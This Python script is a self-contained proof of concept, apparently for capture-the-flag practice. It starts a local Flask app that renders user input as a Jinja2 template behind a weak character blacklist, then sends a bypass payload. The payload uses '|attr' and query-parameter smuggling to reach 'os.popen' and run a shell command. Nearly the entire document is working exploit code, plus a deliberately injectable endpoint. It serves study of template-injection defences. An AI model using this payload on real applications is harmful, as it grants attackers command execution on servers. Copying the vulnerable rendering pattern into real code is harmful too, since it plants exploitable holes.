#!/usr/bin/env python3
"""Filter-bypass SSTI: reach attributes without ``[`` ``]`` or ``_``.

Challenges blacklist ``_``, ``[``, ``]`` to block ``__globals__`` and
subscripting. Jinja2 gives you bracket-free equivalents:

* ``a|attr(name)`` instead of ``a[name]`` / ``a.name``
* ``request.args`` to smuggle the forbidden strings in as query parameters

Here the banned word ``__globals__`` never appears in the template -- it rides
in via ``request.args.g`` and ``|attr`` dereferences it. All LOCAL.
"""
import threading
import time

import requests
from flask import Flask, render_template_string, request
from werkzeug.serving import make_server

app = Flask(__name__)
BLACKLIST = ["_", "[", "]"]


@app.route("/render")
def render():
    q = request.args.get("q", "")
    if any(b in q for b in BLACKLIST):
        return "blocked"
    return render_template_string(q)


srv = make_server("127.0.0.1", 8074, app)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.5)
try:
    # (cycler.next|attr(g)).os.popen(c).read(), with g/c passed as args.
    payload = "{{(cycler.next|attr(request.args.g)).os.popen(request.args.c).read()}}"
    print("template passes blacklist:", not any(b in payload for b in BLACKLIST))
    r = requests.get(
        "http://127.0.0.1:8074/render",
        params={"q": payload, "g": "__globals__", "c": "echo bypassed"},
        timeout=5,
    )
    print("result:", r.text.strip())
finally:
    srv.shutdown()
